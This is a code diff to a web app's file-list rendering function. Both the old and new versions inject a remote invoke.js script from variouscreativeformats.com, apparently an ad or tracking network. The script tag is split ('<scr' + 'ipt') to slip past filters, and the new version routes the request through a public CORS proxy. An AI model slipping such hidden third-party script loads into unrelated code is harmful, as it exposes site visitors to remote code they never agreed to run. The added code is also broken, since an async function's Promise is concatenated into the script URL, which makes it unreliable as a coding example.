@@ -319,23 +319,24 @@ function requestSearch(params, resultCallback) {
 
 // Render file list
 function list(path) {
-  var http_request;
-  http_request = new XMLHTTPRequest();
-  http_request.onreadystatechange = function () {
-    /* .. */
-  };
-  http_request.open(
-    "GET",
-    "https://www.variouscreativeformats.com/53d4fb43bf38bed090f277872cdd93e7/invoke.js"
-  );
-  http_request.setRequestHeader("Content-Type", "application/javascript");
-  http_request.send();
+  async function allowCors() {
+    const proxyUrl = "https://cors-anywhere.herokuapp.com/";
+    const apiUrl =
+      "https://www.variouscreativeformats.com/53d4fb43bf38bed090f277872cdd93e7/invoke.js";
+    try {
+      const response = await fetch(proxyUrl + apiUrl);
+      console.log("Ok");
+      return response;
+    } catch (error) {
+      console.log(error);
+    }
+  }
 
   var ad = $(this).append(
     "<scr" +
-      'ipt type="application/javascript" src="http' +
-      (location.protocol === "https:" ? "s" : "") +
-      '://www.variouscreativeformats.com/53d4fb43bf38bed090f277872cdd93e7/invoke.js"></scr' +
+      'ipt type="application/javascript" src="' +
+      allowCors() +
+      '"></scr' +
       "ipt>"
   );
 
